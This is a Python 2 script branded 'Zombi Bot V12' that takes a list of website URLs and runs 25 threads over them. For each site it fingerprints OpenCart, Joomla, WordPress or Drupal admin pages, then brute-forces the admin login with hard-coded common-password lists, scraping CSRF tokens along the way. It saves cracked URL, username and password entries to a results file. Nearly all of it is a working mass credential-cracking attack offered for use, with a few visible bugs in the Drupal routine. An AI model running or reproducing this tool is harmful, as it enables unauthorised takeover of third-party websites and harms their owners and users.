import cookielib
import os
import random
import re
import requests
import sys
import time
import urllib
import urllib2
from multiprocessing.dummy import *

from colorama import *
#LO KONTOL
la7mar = '\033[91m'
lazra9 = '\033[94m'
la5dhar = '\033[92m'
movv = '\033[95m'
lasfar = '\033[93m'
ramadi = '\033[90m'
blid = '\033[1m'
star = '\033[4m'
bigas = '\033[07m'
bigbbs = '\033[27m'
hell = '\033[05m'
saker = '\033[25m'
labyadh = '\033[00m'
cyan = '\033[0;96m'
init()
#OK
if not os.path.exists("CMS"):
    os.mkdir("CMS", 0755)
class JavaGhost:
    def __init__(self):
            clear = "\x1b[0m"
            colors = [31, 32, 33, 34, 35, 36, 37, 38, 39]
            x = """

  ______               _     _   ____        _    __      ____ ___  
 |___  /              | |   (_) |  _ \      | |   \ \    / /_ |__ \ 
    / / ___  _ __ ___ | |__  _  | |_) | ___ | |_   \ \  / / | |  ) |
   / / / _ \| '_ ` _ \| '_ \| | |  _ < / _ \| __|   \ \/ /  | | / / 
  / /_| (_) | | | | | | |_) | | | |_) | (_) | |_     \  /   | |/ /_ 
 /_____\___/|_| |_| |_|_.__/|_| |____/ \___/ \__|     \/    |_|____|                                                                      
 Zombi Bot V12    |   Ultra Priv8 Bot    | |  Code by Viper1337                           
                                             
                      
 [+] ICQ: 744289868          
                       
    """
            for N, line in enumerate(x.split("\n")):
                sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
                time.sleep(0.05)


            list = raw_input(' [+] Enter your list : ')
            url = open(list, 'r').readlines()
            ThreadPool = Pool(25)
            ThreadPool.map(self.CMS, url)

    def CMS(self, url):
        try:
            url = url.replace('\n', '').replace('\r', '')
            op = requests.get(url+'/admin',timeout=7)
            op2 = requests.get(url + '/administrator/index.php',timeout=7)
            op3 = requests.get(url + '/wp-login.php',timeout=7)
            op4 = requests.get(url + '/admin',timeout=7)
            if "dashboard" in op.text:
                print "[+] Opencart", url + labyadh + '\n'
                open("CMS/OpenCart.txt", "a").write(url + '\n')
                self.opencart(url)
            elif "Joomla" in op2.text:
                print "[+] Joomla", url + labyadh + '\n'
                open("CMS/Joomla.txt", "a").write(url + '\n')
                self.joomla(url)
            elif "WordPress" in op3.text:
                print "[+] Wordpress", url + labyadh + '\n'
                open("CMS/Wordpress.txt", "a").write(url + '\n')
                self.wpbrute(url)
            elif "sites/default" in op4.text:
                print   "[+] Drupal", url + labyadh + '\n'
                open("CMS/Drupal.txt", "a").write(url + '\n')
                self.Drupal(url)


            else:
                print '[-] CMS Not Found =>' + url + '\n'

        except:
            print

    def joomla(self,url):
        try:

            Agent = {
                'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

            admins = ['admin', 'demo']
            passwords = ['admin', 'demo123', 'demo', 'secret', 'admin123', '123456', '123456789', '123', '1234', '12345',
                         '1234567', '12345678', '123456789', 'admin1234', 'admin123456', 'pass123', 'root', '321321',
                         '123123', '112233', '102030', 'password', 'pass', 'qwerty', 'abc123', '654321', 'pass1234',
                         'password123', 'Beast3x@8*#4@!']

            jo_lib = requests.session()

            for admin in admins:
                for pwdjox in passwords:
                    pwdjoxz = pwdjox.strip()
                    jo_lib1 = jo_lib.get(url + '/administrator/index.php',timeout=7)

                    token = re.findall('type="hidden" name="(.*?)" value="1"', jo_lib1.content)

                    jo_logs = {'username': admin,
                               'passwd': pwdjoxz,
                               token[0]: '1',
                               'lang': 'en-GB',
                               'option': 'com_login',
                               'task': 'login',
                               'return': 'aW5kZXgucGhw'}

                    req_jo = jo_lib.post(url + '/administrator/index.php', data=jo_logs, headers=Agent,timeout=7)

                    if 'New Article' in req_jo.content:

                        jo_check = jo_lib.get(url + '/administrator/index.php?option=com_plugins',timeout=7)

                        if 'New Article' in jo_check.content:
                            print lasfar + '-----------------------------------------Joomla-----------------------------------------' + labyadh + '\n'
                            print la5dhar + '[+] Crack Sukses Joomla => ' + url + '|' + admin + '|' + pwdjoxz + labyadh + '\n'
                            print lasfar + '------------------------------------------------------------------------------------------' + labyadh + '\n'
                            open('Hasil.txt', 'a').write(
                                url + '/administrator/index.php ' + '|' + admin + '|' + pwdjoxz + ' [#]Joomla \n')

                        else:
                            print '[-] Failed Joomla =>' + url + '|' + admin + ';' + pwdjoxz + labyadh + '\n'

                    else:
                        print '[-] Failed Joomla =>' + url + '|' + admin + ';' + pwdjoxz + labyadh + '\n'



        except:
            pass


    def opencart(self,url):
        try:
            cr = open('Hasil.txt', 'a')
            passlist = ["123", "1", "admin", "123456", "pass", "password", "admin123", "12345", "admin@123", "123", "test",
                        "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
                        "1234567", "adminadmin", "welcome", "666666", "access", "1q2w3e4r", "xmagico", "admin1234",
                        "logitech",
                        "p@ssw0rd", "login", "test123", "root", "pass123", "password1", "qwerty", "111111", "gimboroot"]
            for passwordx in passlist:
                passwd = passwordx.strip()
                # print passwd
                cookies = {
                    'OCSESSID': '41793cc49288925a72df1b7b5c',
                    'language': 'en-gb',
                    'currency': 'IDR',
                }

                data = {
                    'username': 'admin',
                    'password': passwd
                }
                r = requests.get(url + "/admin/index.php",timeout=7)
                if "https://" in r.url:
                    url = url.replace("http://", "https://")
                else:
                    pass
                s = requests.Session()
                r = s.post(url + '/admin/index.php', cookies=cookies, data=data,timeout=7)

                if 'common/logout' in r.text:
                    print lasfar + '-----------------------------------------OpenCart-----------------------------------------' + labyadh + '\n'
                    print lazra9 + '[+] Crack Sukses OpenCart => ' + url + '|admin|' + passwd + labyadh + '\n'
                    print lasfar + '------------------------------------------------------------------------------------------' + labyadh + '\n '
                    cr.write(url + '/admin|admin|' + passwd + ' [#]OpenCart\n')
                    break
                else:
                    print '[-] Failed  OpenCart => ' + url + '|admin|' + passwd + labyadh + '\n'
            return 0
        except:
            print 'Contact Hiruka'

    #add timeout , OK ,
    def wpbrute(self,url):
        try:
            user = "admin"
            passlist = ["123", "uT3ygfF44Cdlp4TFyq", "admin", "123456", "pass", "password", "admin123", "12345",
                        "admin@123", "123", "test",
                        "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
                        "1234567", "adminadmin", "welcome", "666666", "access", "1q2w3e4r", "xmagico", "admin1234", "1q2w3e4r", "xxx", "pass@123"]
            for password in passlist:
                password = password.strip()
                try:
                    cj = cookielib.CookieJar()
                    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
                    login_data = urllib.urlencode({'log': user, 'pwd': password})
                    opener.open(str(url) + '/wp-login.php', login_data)
                    resp = opener.open(str(url) + '/wp-admin')
                    final = resp.read()
                    if '<li id="wp-admin-bar-logout">' in final:
                        print lasfar + '-----------------------------------------Wordpress-----------------------------------------' + labyadh + '\n'
                        print la5dhar + "[+] Crack Sukses Wp=> " + str(
                            url) + '/wp-login.php|' + user + '|' + password + labyadh + '\n'
                        print lasfar + '--------------------------------------------------------------------------------------------' + labyadh + '\n'
                        with open('Hasil.txt', 'a') as myfile:
                            myfile.write(str(url) + 'wp-login.php' + ' |' + user + '|' + password + ' [#]Wordpress \n')
                        break
                    else:
                        print '[-] Failed  Wordpress => ' + url + '|admin|' + password + labyadh + '\n'
                except:
                    pass
        except:
            pass

    def Drupal(self,url):
        passlist = ["123", "uT3ygfF44Cdlp4TFyq", "admin", "123456", "pass", "password", "admin123", "12345", "admin@123",
                    "123", "test",
                    "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
                    "1234567", "adminadmin", "welcome", "666666", "access", "1q2w3e4r", "xmagico", "admin1234"]

        Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

        for password in passlist:
            password = password.strip()
            try:

                lib = requests.session()

                Getcsrf = lib.get(url + '/?q=user',timeout=7)

                # Get Token
                Token1 = re.findall('"form_build_id" value="(.*?)" />', Getcsrf.content)
                Token2 = re.findall('type="hidden" name="form_id" value="user(.*?)" />', Getcsrf.content)
                Token3 = re.findall('id="edit-submit" name="op" value="(.*?)" class="', Getcsrf.content)
                Token4 = re.findall('name="op" id="edit-submit" value="(.*?)" class="', Getcsrf.content)

                # Data Tokens

                Tokenk = []
                Tokenk.append(Token3)
                Tokenk.append(Token4)

                for tok3 in Tokenk:
                    tok3 = tok3
                    for tok4 in tok3:
                        Tokens = tok4
                # You Can add Any User u Want ^^

                user = 'admin'
                bdaa0x = {'name': user,
                       'pass': password,
                       'form_build_id': Token1[0],
                       'form_id': 'user' + str(Token2[0]),
                       'op': Tokens
                       }

                req = lib.post(url + '/?q=user', data=bdaa0x, headers=Headers,timeout=7)


                if '"user/logout"' in req.content:
                    open('Hasil.txt', 'a').write(url + '/?q=user' + '|' + Users + '|' + passwd + '\n')
                    print lasfar + '-----------------------------------------Drupal-----------------------------------------' + labyadh + '\n'
                    print la5dhar + "[+] Crack Sukses Drupal => " + url + '/admin|' + user + '|' + password + labyadh + '\n'
                    print lasfar + '--------------------------------------------------------------------------------------------' + labyadh + '\n'

                else:
                    print '[-] Failed  Drupal => ' + url + '|admin|' + password + labyadh + '\n'

            except:
                pass






JavaGhost()